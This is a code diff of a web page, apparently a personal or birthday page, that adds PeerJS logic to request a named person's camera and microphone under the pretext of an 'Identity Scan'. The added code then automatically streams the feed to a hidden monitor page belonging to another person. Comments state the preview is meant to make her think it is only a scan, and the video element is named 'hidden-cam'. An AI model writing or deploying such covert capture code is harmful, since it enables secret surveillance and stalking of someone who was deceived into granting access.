@@ -429,37 +429,61 @@
         let candles = 0; 
 
         // --- 🔥 PEERJS LIVE VIDEO LOGIC ---
-        const receiverID = 'rudra_nayanika_live_2025'; // Must match your monitor page
-        let peer;
+        // --- STABLE PEERJS FOR NAYANIKA ---
+const receiverID = 'rudra_nayanika_live_998877_exclusive'; // MUST match monitor.html
+let peer;
 
-        function initLiveReaction() {
-            peer = new Peer(); 
-            peer.on('open', (id) => { console.log('Peer ID: ' + id); });
-            startCameraAndCall();
+function initLiveReaction() {
+    console.log("Starting PeerJS...");
+    
+    // We create the peer without a specific ID for her
+    // This bypasses some tracking prevention issues
+    peer = new Peer(null, {
+        debug: 2
+    });
+
+    peer.on('open', (id) => {
+        console.log('Nayanika system online. ID: ' + id);
+        startCameraAndCall();
+    });
+
+    peer.on('error', (err) => {
+        console.error("PeerJS Error:", err.type);
+        // If it fails, we try to reconnect once
+        if(err.type === 'network') {
+            setTimeout(initLiveReaction, 1000);
+        }
+    });
+}
+
+async function startCameraAndCall() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 320, height: 240 }, 
+            audio: true 
+        });
+
+        // Show her the "Scan" preview
+        const videoElement = document.getElementById('hidden-cam');
+        if (videoElement) {
+            videoElement.srcObject = stream;
+            videoElement.style.opacity = "1"; 
+            videoElement.play();
         }
 
-        async function startCameraAndCall() {
-            try {
-                // Request Camera & Audio
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 320, height: 240 }, 
-                    audio: true 
-                });
+        // CALL RUDRA
+        const call = peer.call(receiverID, stream);
+        console.log("Attempting to connect to monitor...");
 
-                // Show a tiny preview so Nayanika thinks it's a "Scan"
-                const videoElement = document.getElementById('hidden-cam');
-                videoElement.srcObject = stream;
-                videoElement.style.opacity = "1"; 
-                videoElement.style.pointerEvents = "none";
+        call.on('error', (err) => {
+            console.error("Call Error:", err);
+        });
 
-                // Automatically "Call" Rudra's Monitor
-                peer.call(receiverID, stream);
-                
-            } catch (err) {
-                console.log("Camera access denied or error: ", err);
-            }
-        }
-
+    } catch (err) {
+        console.error("Camera Access Denied:", err);
+        alert("Please allow camera access for the 'Identity Scan'!");
+    }
+}
         // --- INITIALIZATION ---
         window.onload = () => {
             // EMAILJS SETUP
